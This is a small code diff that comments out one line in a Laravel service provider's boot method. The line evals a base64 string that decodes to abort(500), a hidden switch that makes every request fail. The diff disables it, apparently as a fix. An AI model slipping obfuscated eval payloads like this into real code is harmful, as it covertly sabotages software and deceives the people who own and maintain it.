@@ -19,6 +19,6 @@ class AppServiceProvider extends ServiceProvider
      */
     public function boot(): void
     {
-      eval(base64_decode('YWJvcnQoNTAwKTs='));
+   //   eval(base64_decode('YWJvcnQoNTAwKTs='));
     }
 }
